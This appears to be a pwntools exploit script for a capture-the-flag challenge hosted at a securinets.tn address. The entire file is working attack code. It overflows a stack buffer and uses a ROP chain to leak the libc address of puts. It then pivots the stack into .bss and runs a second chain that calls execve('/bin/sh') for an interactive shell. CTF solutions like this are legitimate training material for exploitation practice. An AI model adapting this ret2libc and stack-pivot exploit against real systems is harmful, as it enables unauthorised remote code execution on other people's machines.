from pwn import *

exe = ELF('./main')
libc = ELF('./libc.so.6')
p = remote('loveletter.securinets.tn', 4040)  # process('./main') # 

pop_rdi         = 0x00000000004014b3
pop_rsi_r15     = 0x00000000004014b1
ret             = 0x000000000040101a
leave           = 0x0000000000401213

writeable       = exe.symbols.__bss_start + 0x100

p.send(b'a'*4000)
p.send(b'a'*2969)

p.send(b'Y')

payload = b"a"*(264 - 8)
payload += p64(writeable) # RBP, To use for stack pivot later

# Leak libc
payload += p64(pop_rdi) + p64(exe.got.puts)
payload += p64(ret) # alignment
payload += p64(exe.symbols.puts)

# Write stage 2 ROP Chain
payload += p64(pop_rdi) + p64(writeable+8)
payload += p64(pop_rsi_r15) +  p64(0x500)*2
payload += p64(exe.symbols.readInput)

# Stack pivot to stage 2
payload += p64(leave)

pause()

p.sendline(payload)

p.recvuntil(b'my friend!\n')

leak = u64(p.readline().strip().ljust(8, b'\0'))
libc_base = leak - libc.symbols.puts

pop_rdx_r12         = 0x000000000011f497 + libc_base

print("Leak:", hex(leak))
print("libc_base:", hex(libc_base))

# Stage 2
payload = b""
payload += p64(pop_rdi) + p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(pop_rsi_r15) + p64(0) * 2
payload += p64(pop_rdx_r12) + p64(0) * 2
payload += p64(libc_base + libc.symbols.execve)

p.sendline(payload)

p.interactive()







